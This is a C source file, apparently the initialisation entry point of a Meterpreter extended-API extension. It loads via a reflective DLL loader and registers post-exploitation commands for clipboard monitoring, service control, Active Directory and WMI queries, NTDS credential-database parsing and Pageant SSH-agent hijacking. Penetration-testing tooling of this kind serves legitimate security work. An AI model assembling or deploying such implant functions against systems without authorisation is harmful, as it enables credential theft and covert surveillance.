/*!
 * @file extapi.h
 * @brief Entry point and intialisation definitions for the extended API extension.
 */
#include "common.h" 

#include "common_metapi.h" 

// Required so that use of the API works.
MetApi* met_api = NULL;

#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "window.h"
#include "service.h"
#include "clipboard.h"
#include "adsi.h"
#include "wmi.h"
#include "ntds.h"
#include "pageantjacker.h"

/*! @brief List of commands that the extended API extension providers. */
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_EXTAPI_WINDOW_ENUM, request_window_enum),
	COMMAND_REQ(COMMAND_ID_EXTAPI_SERVICE_ENUM, request_service_enum),
	COMMAND_REQ(COMMAND_ID_EXTAPI_SERVICE_QUERY, request_service_query),
	COMMAND_REQ(COMMAND_ID_EXTAPI_SERVICE_CONTROL, request_service_control),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_GET_DATA, request_clipboard_get_data),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_SET_DATA, request_clipboard_set_data),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_MONITOR_START, request_clipboard_monitor_start),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_MONITOR_PAUSE, request_clipboard_monitor_pause),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_MONITOR_RESUME, request_clipboard_monitor_resume),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_MONITOR_PURGE, request_clipboard_monitor_purge),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_MONITOR_STOP, request_clipboard_monitor_stop),
	COMMAND_REQ(COMMAND_ID_EXTAPI_CLIPBOARD_MONITOR_DUMP, request_clipboard_monitor_dump),
	COMMAND_REQ(COMMAND_ID_EXTAPI_ADSI_DOMAIN_QUERY, request_adsi_domain_query),
	COMMAND_REQ(COMMAND_ID_EXTAPI_NTDS_PARSE, ntds_parse),
	COMMAND_REQ(COMMAND_ID_EXTAPI_WMI_QUERY, request_wmi_query),
	COMMAND_REQ(COMMAND_ID_EXTAPI_PAGEANT_SEND_QUERY, request_pageant_send_query),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote* remote)
{
    met_api = api;

	met_api->command.register_all(customCommands);

	initialise_clipboard();
	initialise_service();

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all(customCommands);

	return ERROR_SUCCESS;
}
